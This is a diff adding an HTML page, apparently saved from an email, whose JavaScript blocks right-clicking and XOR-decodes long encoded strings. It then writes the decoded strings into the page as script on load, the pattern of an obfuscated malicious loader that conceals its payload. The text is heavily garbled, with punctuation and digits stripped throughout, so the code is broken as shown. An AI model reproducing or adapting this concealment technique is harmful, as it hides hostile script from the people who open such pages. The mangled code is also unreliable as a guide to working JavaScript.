@@ -1,0 +1,219 @@
+
+html
+body
+ saved from urldhttpinternetemail 
+head
+script languagedjavascript
+if windowevent  only netscape will have the capital e
+  documentcaptureeventseventmouseup  catch the mouse up event
+function nocontextmenu   this function only applies to ie ignored ot
+herwise
+
+	eventcancelbubble d true
+	eventreturnvalue d false
+
+	return false
+
+function norightclicke	 this function is used by all others
+
+	if windowevent	 again ie or nav
+	
+		if ewhich dd   ewhich dd 
+			return false
+	
+	else
+		if eventbutton dd   eventbutton dd 
+		
+			eventcancelbubble d true
+			eventreturnvalue d false
+			return false
+		
+	
+
+
+documentoncontextmenu d nocontextmenu		 for ie
+documentonmousedown d norightclick		 for all others
+script
+
+script
+var charescapeddfffefdfcfbfaffffffffffefee
+edecebeaeeeeeeeeeedfdedddcdbdaddddd
+dddddcfcecdcccbcaccccccccccbfbebd
+bcbbbabbbbbbbbbbafaeadacabaaaaaaaa
+aaaafedcbafedc
+bafedcba
+fedcbafedcba
+fedcba
+fedcbafedcba
+fedcba
+fedcba
+var charall    d unescape charescaped 
+
+function bound minval value maxval 
+    if value  minval         value d minval   
+   if value  maxval         value d maxval    
+   return value
+
+
+function aton string index 
+  
+   index d bound  index stringlength 
+   return charallindexof stringcharat index   
+
+
+function ntoa index 
+   convert a number to a character  the range is x to xff inclusiv
+e
+    revision  becd
+   index d bound  index xff 
+   return charallcharat index 
+
+
+function xor data pattern 
+ 
+   var ii d     var jj d   var result d   if pattern dd 
+null  pattern dd   patternlength d          pattern d 
+simplexorpattern    
+   for ii d  ii  datalength ii  
+      if jj d patternlength  
+         jj d 
+      
+      result d ntoa aton data ii   aton pattern jj 
+   
+   return result
+
+function dede data pattern      return xor unescape data  pattern 
+ 
+ 
+
+script
+script
+function go
+
+var ttd
+
+ttddedeaabaabaaaaecaaaaaeeedbedbafa
+aabaeabaaeeabbbfceeffffefefff
+fdefefefeeedeeadabaaabeaeedebbaaaaf
+afbffaaeaaaadacbaaafaaeaabaadba
+bfaabfbaaebebacbbbdfaaeaaabbafafb
+ffaaeabdaebcaaaaabcbefbabeebbabbeab
+adafabafaaeafabbfaabdbabfbefbaaeabb
+aabbadbfabaaeaeefdb
+
+documentwritescript
+documentwritett
+documentwrite
+documentwriteuf
+documentwritescript
+documentwrite
+
+ttddedeffefecbcaabcaffcfdeeabaaaf
+afaaabcabaeaaeabaaadbffbffcff
+feeffcfffaeabaaafafaaabca
+baffffefeaaaaafbeaabaebabaa
+abefebfffafcffecbbabaefffdcf
+ebbeabedbfeeeffeefea
+feceffecffefaffeff
+ecdaf
+documentwritett
+ttddedeffefecaadaabcaaabaaadffbe
+afadaabaaacaaacffdebdaafbcafffbfbea
+daaabafafadabaebaecaaabeafadbeffaffce
+effafffcecbfaabfafffafceeeaeaf
+aaabefaaaaabaffaadeaafaeaabb
+aadaaaafffcebabaaacaaacaaaabffdecbfa
+abfafeafbfcfbedeeeaabacabaffcffa
+ffcf
+documentwritett
+ttddedeffcecbebaaafafbeabbeadaaabaf
+aadacbebbfaacbeafeafdffaeeeaeafaaab
+efeafaabafaeacffecaaaacafabafabfadbe
+fffedffeeecadaafadfadbaada
+eabfabaffffafaabaaeeaaadafabeaabaa
+aebbfaaaaadabbecabeecaaaadfefee
+adbacafababadbeabfebbcaadeaaeaafabadbb
+ebadbeabeaaebbadaafaaaecabaaabdaabebe
+baaebeaaeebbabaafe
+documentwritett
+ttddedefbeaecbbafaebafabaabfebaebeaaecaaa
+aeabaaebaecbcaaebbfabaaaeefafa
+ebeaeccafedeaee
+ebeeeeeecadebfeafeafbaaebabe
+aeadbebbadeaaaabeaeaabcebfadaaaebabfea
+aaaaadeaeeeafbdaecaabaeabaadecbfa
+beaacecaacecfafaeeabedeebed
+faeffeffeccffefedff
+ecaaaacafabafabfadbeffef
+documentwritett
+ttddedefdceaaaaaabafeaaebaaaaadee
+dbaaadaeecafabdadbaaadeebfaabfebba
+baaaaeebfabaffcfffffceffeaad
+eefbeafeaffeeeffaef
+faadeaafaeaabbaadaaaafffcebabaaa
+caaacaaaabffdecbfaabfafeafbfcfbedeeea
+abacabaffcffaffcffceaba
+aafafaaafacaadffbeaaaafabcfff
+deadabefeeaecbbbaffeaabcbebcfeebfbdbbe
+aaaabaaaeabaaeaaaadabeaabbafdfde
+abadee
+documentwritett
+ttddedeecbcaabcaffcfecaaabeafadbeffbff
+ecabaadfeeabebbbfeebdbbbcebaababfeb
+eaabfeeeffedeefaabffaeaabeecadaaf
+adfadbaadaeabfabafefefcaadabffeadf
+eeffeffecfffeadaaabafaaa
+eaaadffceaadaababcffdfcecaaabfe
+eeebbbbeabfeeabcbbfeebfbbbfeaaaabcaba
+eabaaeaaaabadbeadbbafffeababeaeabba
+acbaffbfeaeabaaebaffffaeabaafaaf
+eaabcbebcfeebfbdbbebeabbabebeaafbeea
+ffebeefaebaf
+documentwritett
+ttddedefadaabceaaaaaabafabbeaaaebabad
+feffbdabbaabfbbfeabfeeffedffe
+ceffceabaaafafaaafacaadffb
+eaaaafabcfffdeadabefeeaecbbbaffeaabc
+bebcfeebfbdbbeaaaabaaaeabaaeaaaa
+dabeaabbafdfeabadeeebbfaacbeaffffea
+abacabaffdffdeabeaeaefeaabbfbfeebb
+bcbfebeabfabcebeaaebceeaffeaeefabef
+faaaabebaeadabaffaabaaaaecbabadfef
+feaadeaaaebbfeaafeeffeffeff
+feeeffecfffeaadf
+
+documentwritett
+ttddedeffefecbcaabcafefffedeecaaa
+aafafaadabcafbeebaaabaaeabffcff
+fffaffeffaffafea
+aaaaabafeabaafaeefeebbbaafaabbc
+beaaebaaabaefeebaaaaecaafbeaeebae
+aadaababbbecabdbeebabfadeeeaadaadfaf
+feaaaaafafeeacaeeefebfeee
+ffeeffecffeaffeed
+ffeecaaaacafabafabfadbeffe
+ffeedffeeffecffeaf
+feedffefcffeffeeec
+ffefeff
+documentwritett
+
+ 
+
+
+
+
+
+script
+head
+
+
+body 
+script
+go
+script
+body
+bodyhtml
+
+
+
+
